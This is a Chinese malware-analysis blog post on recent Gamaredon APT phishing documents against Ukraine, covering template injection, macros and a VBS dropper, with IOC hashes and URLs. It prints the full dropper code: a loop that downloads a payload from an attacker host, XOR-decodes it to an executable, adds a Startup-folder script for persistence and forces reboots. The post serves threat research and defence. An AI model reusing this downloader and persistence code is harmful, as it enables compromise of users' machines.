> 原文链接: https://www.anquanke.com//post/id/197300 


# 俄罗斯组织Gamaredon近期活动分析


                                阅读量   
                                **1219819**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t0108fff5fb0259d2e3.png)](https://p5.ssl.qhimg.com/t0108fff5fb0259d2e3.png)



## 背景

最近在样本追踪中，发现了一例疑似Gamaredon的攻击，随后依靠开源情报，发现Gamaredon近期还比较活跃，近一个月投递了众多针对乌克兰地区的攻击样本。而Gamaredon是一个俄罗斯的APT攻击组织，首次出现于2013年,主要是针对乌克兰进行网络间谍活动。2017年，Palo Alto披露过该组织针对乌克兰攻击活动的细节，并首次将该组织命名为Gamaredon group。



## 基本信息

原始样本hash为：c0dc0c23e675d0c380e243fb36ee005e

vt上传时间为1月14日

[![](https://p3.ssl.qhimg.com/t012c33f895caaa5731.png)](https://p3.ssl.qhimg.com/t012c33f895caaa5731.png)

样本下载后，通过winhex查看基本可以确定是office格式的文档

[![](https://p2.ssl.qhimg.com/t0116a5f48e4c146c47.png)](https://p2.ssl.qhimg.com/t0116a5f48e4c146c47.png)

尝试压缩软件打开可知是docx文档

[![](https://p5.ssl.qhimg.com/t01ed2287b5dfaaf487.png)](https://p5.ssl.qhimg.com/t01ed2287b5dfaaf487.png)

添加docx后缀打开之后，是模板注入的攻击样本

[![](https://p1.ssl.qhimg.com/t019eb079ca4fa076f1.png)](https://p1.ssl.qhimg.com/t019eb079ca4fa076f1.png)

注入地址为 hxxp://dochlist[.]hopto.org/opt[.]dot

文档内容如下

[![](https://p4.ssl.qhimg.com/t01e13cb2e032207d76.png)](https://p4.ssl.qhimg.com/t01e13cb2e032207d76.png)

通过查询，我们可以得知文章内容是乌克兰语，署名是&lt;乌克兰安全局&gt;

[![](https://p2.ssl.qhimg.com/t010ed4efd9a6520533.png)](https://p2.ssl.qhimg.com/t010ed4efd9a6520533.png)

文档最上方的图案也对应了乌克兰安全局Служба безпеки України的官网图标

[![](https://p1.ssl.qhimg.com/t01f301c960562b50b3.png)](https://p1.ssl.qhimg.com/t01f301c960562b50b3.png)

而根据对Gamaredon的了解，我们也知道该组织自2013年开始，就常针对乌克兰的政府人员发起攻击，常见手法便是伪装乌克兰安全局，分发相关的钓鱼邮件，与本次攻击颇为符合。



## 注入文档分析

将原始文档注入的dot下载到本地，MD5为689fab7a016dae57300048539a4c807e

注入的dot文档内容为空，是一个宏代码利用文档：

[![](https://p2.ssl.qhimg.com/t0138631a0913853776.png)](https://p2.ssl.qhimg.com/t0138631a0913853776.png)

查看宏代码，是Gamaredon很常用的一套代码

[![](https://p3.ssl.qhimg.com/t01c028d756eb1dc0a1.png)](https://p3.ssl.qhimg.com/t01c028d756eb1dc0a1.png)

宏代码最开始创建了两个对象

分别是Wscript.Shell和Wscript.Network,用于后面的shell执行以及网络请求

<code>Dim yOer<br>
yOer = "Set WShell=CreateObject(""WSc" + "ri" + "pt.S" + "hel" + "l"")"<br>
Set DurJ = CreateObject("WScr" + "ipt.Ne" + "two" + "rk")</code>

然后通过代码创建Scripting.FileSystemObject对象以提供对文件系统的访问

`Set hIYg = CreateObject("Sc" + "rip" + "ting.Fi" + "leSy" + "stemOb" + "ject")`

然后获取当前的主机信息，拼接为一个请求字符串,用于后续的请求

请求地址为 hxxp://skrembler[.]hopto[.]org/WIN-IHN30SD7IMB_9AC9AA87/tor[.]php”

[![](https://p0.ssl.qhimg.com/t01c46222da20d2d33b.png)](https://p0.ssl.qhimg.com/t01c46222da20d2d33b.png)

宏代码执行完成后，会在%APPDATA%MicrosoftWindowsStart MenuProgramsStartup路径下释放security.vbs文件

[![](https://p3.ssl.qhimg.com/t019a4cccacae53717d.png)](https://p3.ssl.qhimg.com/t019a4cccacae53717d.png)

释放的vbs文件hash为195f3fab75ca0602a8c2053070dd1ca3

释放文件的代码格式化后如下：

```
On Error Resume Next
Dim MTYj
MTYj = DateAdd(“s”, 25, Now())
Do Until (Now() &gt; MTYj)
Loop

Function CZeq(oBIE)
On Error Resume Next
Set bkDw = CreateObject(“MSXML2.XMLHTTP”)
With bkDw
.Open “GET”, oBIE, False
.send
End With
If bkDw.Status = 200 Then
CZeq = bkDw.ResponseBody
End If
End Function

Function Encode( FCkE, BGmO, msKq )
Dim joCE, HHHm, NgjR, jIFy, vHqt, mzrI
Const ForAppending = 8
Const ForReading = 1
Const ForWriting = 2
Const TristateFalse = 0
Const TristateMixed = -2
Const TristateTrue = -1
Const TristateUseDefault = -2
On Error Resume Next
If Not IsArray( msKq ) Then
msKq = Array( msKq )
End If
For joCE = 0 To UBound( msKq )
If Not IsNumeric( msKq(i) ) Then
Encode = 1032
Exit Function
End If
If msKq(joCE) &lt; 0 Or msKq(joCE) &gt; 255 Then
Encode = 1031
Exit Function
End If
Next
Set HHHm = CreateObject( “Scripting.FileSystemObject” )
If HHHm.FileExists( FCkE ) Then
Set NgjR = HHHm.GetFile( FCkE )
Set vHqt = NgjR.OpenAsTextStream( ForReading, TriStateFalse )
Else
vHqt.Close
Set vHqt = Nothing
Set NgjR = Nothing
Set HHHm = Nothing
Exit Function
End If
If HHHm.FileExists( BGmO ) Then
vHqt.Close
Set vHqt = Nothing
Set NgjR = Nothing
If HHHm.Fileexists( FCkE) Then HHHm.DeleteFile FCkE
Set HHHm = Nothing
Exit Function
Else
Set jIFy = HHHm.CreateTextFile( BGmO, True, False )
End If
set joCE = 0
Do Until vHqt.AtEndOfStream
For joCE = 0 To UBound( msKq )
joCE + 1 mod ( UBound( msKq ))
jIFy.Write Chr( Asc( vHqt.Read( 1 ) ) Xor msKq(joCE) )
if vHqt.AtEndOfStream Then Exit Do
Next
Loop
set joCE = 0
Do Until vHqt.AtEndOfStream
joCE = ( joCE + 1 ) ( UBound( msKq ) + 1 )
jIFy.Write Chr( Asc( vHqt.Read( 1 ) ) Xor msKq(mzrI) )
joCE=joCE+1
If mzrI&lt;UBound( msKq ) Then
mzrI=mzrI+1
else mzrI=0
End If
Loop
jIFy.Close
If HHHm.Fileexists(FCkE) Then HHHm.DeleteFile FCkE
vHqt.Close
Set vHqt = Nothing
Set NgjR = Nothing
Set jIFy = Nothing
Set HHHm = Nothing
On Error Goto 0
End Function

Function GetHKcc( KCel )
Dim joCE, msKq( )
ReDim msKq( Len( KCel ) - 1 )
For joCE = 0 To UBound( msKq )
msKq(joCE) = Asc( Mid( KCel, joCE + 1, 1 ) )
Next
GetHKcc = msKq
End Function

Function pdBR(ByVal QopZ)
Dim qsGf
Const EhpF = “abcdefghijklmnopqrstuvwxyz0123456789”
Randomize
For joCE = 1 To QopZ
qsGf = qsGf &amp; Mid(EhpF, Int(36 * Rnd + 1), 1)
Next
pdBR = qsGf
End Function

Sub save(data)
Dim vNsF
vNsF = “1”
vNsF = pdBR(5)
Set CQLk = CreateObject(“Scripting.FileSystemObject”)
Set jSmA = CreateObject(“ADODB.Stream”)
On Error Resume Next
jSmA.Open
jSmA.Type = 1
jSmA.Write (data)
jSmA.Position = 0
Set CQLk = Nothing
jSmA.SaveToFile “C:UsersShytAppDataRoamingMicrosoftExcel”+ vNsF +”.txt”
jSmA.Close
WScript.Sleep 7273
Set PaKX = CreateObject(“Scripting.FileSystemObject”)
Set lCPt = PaKX.GetFile(“C:UsersShytAppDataRoamingMicrosoftExcel”+ vNsF +”.txt”)
If lCPt.Size &lt; 1025 Then lCPt.Delete
Dim arrHKcc, kcEE
arrHKcc = GetHKcc( “9AC9AA87”)
kcEE = Encode( “C:UsersShytAppDataRoamingMicrosoftExcel”+ vNsF +”.txt”, “C:UsersShytAppDataRoamingMicrosoftExcel”+vNsF+”.exe”, arrHKcc )
WScript.Sleep 6425
If PaKX.FileExists( “C:UsersShytAppDataRoamingMicrosoftExcel”+ vNsF +”.txt” ) Then PaKX.DeleteFile “C:UsersShytAppDataRoamingMicrosoftExcel”+ vNsF +”.txt”
If PaKX.FileExists( “C:UsersShytAppDataRoamingMicrosoftExcel”+vNsF+”.exe” ) Then
Set DeCQ = PaKX.CreateTextFile(“C:UsersShytAppDataRoamingMicrosoftWindowsStart MenuProgramsStartup”+ vNsF +”.vbs”, True, True)
DeCQ.Write “On Error Resume Next” &amp; vbCrLf
DeCQ.Write “Set PaKX = CreateObject(“”Scripting.FileSystemObject””)”&amp; vbCrLf
DeCQ.Write “createobject(“”Wscript.Shell””).run “”C:UsersShytAppDataRoamingMicrosoftExcel”+vNsF+”.exe””,0” &amp; vbCrLf
DeCQ.Write “PaKX.DeleteFile Wscript.ScriptFullName”&amp; vbCrLf
DeCQ.Close
End If
If kcEE &lt;&gt; 0 Then
End If
End Sub

hutC = 1
Do While hutC &gt; 0
WScript.Sleep 181224
save CZeq(“http://skrembler.hopto.org/WIN-IHN30SD7IMB_9AC9AA87/tor.php“)
Dim QKLN, zIvq, jJjj, CQLk
Set YDJG = CreateObject(“Scripting.FileSystemObject”)
QKLN = YDJG.GetParentFolderName(“C:UsersShytAppDataRoamingMicrosoftExcel”+vNsF+”.exe”)
With WScript.CreateObject(“Scripting.FileSystemObject”)
Set HHHm = CreateObject(“Scripting.FileSystemObject”)
If HHHm.Fileexists(“C:UsersShytAppDataRoamingMicrosoftExcel”+ vNsF +”.txt”) Then HHHm.DeleteFile “C:UsersShytAppDataRoamingMicrosoftExcel”+ vNsF +”.txt”
jJjj = 0
For Each zIvq In .GetFolder(QKLN).Files
If UCase(.GetExtensionName(zIvq.Name)) = UCase(“exe”) Then
jJjj = jJjj + 1
End If
Next
If (jJjj &gt; 2) Then
Dim NYBz, IHEL, IHELSheck
Set NYBz = GetObject(“WinMgmts:`{`(Shutdown,RemoteShutdown)`}`!.RootCIMV2:Win32OperatingSystem”)
Set IHEL = NYBz.Instances
For Each IHELSheck In IHEL
IHELSheck.Reboot()
Next
End If
End With
Loop
```

程序最开始通过

<code>On Error Resume Next<br>
Dim MTYj<br>
MTYj = DateAdd("s", 25, Now())<br>
Do Until (Now() &gt; MTYj)<br>
Loop</code>

启用一个循环，从行为来看应该是用于反沙箱

该程序的入口点在程序最下方，程序通过

<code>hutC = 1<br>
Do While hutC &gt; 0<br>
WScript.Sleep 181224</code>

的设置来启动一个永真循环，这里的slepp应该也是反沙箱的设计

接着程序尝试请求之前拼接好的请求地址，并且如果请求成功则会将返回的body做为参数传入到save函数用于保存

`save CZeq("http://skrembler.hopto.org/WIN-IHN30SD7IMB_9AC9AA87/tor.php")`

Czeq函数如下

[![](https://p1.ssl.qhimg.com/t01dbd56375764ca09e.png)](https://p1.ssl.qhimg.com/t01dbd56375764ca09e.png)

如果成功请求，则会将返回值写入到%APPDATA%MicrosoftExcel 目录下，文件名为由pdBR生成的5位随机数

尝试将传入进来的data进行写入，写入之后程序会判断文件大小是否大于1025，如果小于则删除

如果文件大于1025说明成功请求，则会将txt文件作为参数传递到Encode进行解密，解密后会在当前目录释放一个与txt同名的exe文件。

exe文件成功释放之后程序会在%APPDATA%MicrosoftWindowsStart MenuProgramsStartup目录下释放一个同名的vbs文件，该vbs文件用于调用执行刚才解密的exe。

[![](https://p4.ssl.qhimg.com/t01383787a1fd22321e.png)](https://p4.ssl.qhimg.com/t01383787a1fd22321e.png)

程序成功保存并运行后，攻击者还将通过指定目录下的exe个数来控制是否重启用户的计算机：

[![](https://p5.ssl.qhimg.com/t0188a3e48e5e2d44a0.png)](https://p5.ssl.qhimg.com/t0188a3e48e5e2d44a0.png)



## 关联样本分析

后续通过开源情报，找到众多关联的样本，这里以hash为4778869cf2564b14b6bbf4baf361469a的样本做作对比。

样本同样是docx模板注入，注入地址为：

[http://yotaset.ddns.net/yota.dot](http://yotaset.ddns.net/yota.dot)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t017d497172e9918011.png)

文档内容如下

[![](https://p4.ssl.qhimg.com/t01d95952dedcc6a8ae.png)](https://p4.ssl.qhimg.com/t01d95952dedcc6a8ae.png)

文档内容署名为：

Головне управління розвідки<br>
Міністерство оборони України

译为

通用情报局<br>
乌克兰国防部

而文章冒充的ICTV是乌克兰本地的官方电台节目。

关联样本所注入的dot文档也是宏代码利用，结构和原始文档几乎保持一致，有细微的不同，比如通过如下的命令设置宏属性为安全

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0192f135b8cf8f725b.png)

同样的，关联的样本也会在

%APPDATA%MicrosoftWindowsStart MenuProgramsStartup路径下释放vbs文件

释放的vbs也只有微小的差异，比如多了这一段代码：

[![](https://p3.ssl.qhimg.com/t01badcef1364758db2.png)](https://p3.ssl.qhimg.com/t01badcef1364758db2.png)

VBS成功执行，释放的PE文件如下

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01ea070ca99701a9dd.png)



## IOCs

文件hash

c0dc0c23e675d0c380e243fb36ee005e<br>
689fab7a016dae57300048539a4c807e<br>
195f3fab75ca0602a8c2053070dd1ca3<br>
4778869cf2564b14b6bbf4baf361469a<br>
ba9b05847e50e508ee2decd9dde42032<br>
9735c41349cfa48cc2e7a33e2f33c116

通过关联，最后找到如下的dot分发地址以及样本请求地址

hxxp://office-constructor.ddns.net/obce.dot<br>
hxxp://librebooton.ddns.net/booton.dot<br>
hxxp://inbox-office.ddns.net/inbox.dot<br>
hxxp://libre-templates.ddns.net/internet.dot<br>
hxxp://word-gread.ddns.net/gread.dot<br>
hxxp://win-apu.ddns.net/apu.dot<br>
hxxp://office-lite.ddns.net/lite.dot<br>
hxxp://libre-templates.ddns.net/internet.dot<br>
hxxp://office-crash.ddns.net/crash.dot<br>
hxxp://office-out.ddns.net/out.dot<br>
hxxp://libre-templates.ddns.net/internet.dot<br>
hxxp://librebooton.ddns.net/booton.dot<br>
hxxp://micro-set.ddns.net/micro.dot<br>
hxxp://office-constructor.ddns.net/zaput.dot<br>
hxxp://win-ss.ddns.net/ss.dot<br>
hxxp://office-constructor.ddns.net/zaput.dot<br>
hxxp://get-icons.ddns.net/ComputerName_HardDriveSerialNumber//autoindex.php<br>
hxxp://network-crash.ddns.net/<br>
hxxp://network-crash.ddns.net/ComputerName_HardDriveSerialNumber/autoindex.php
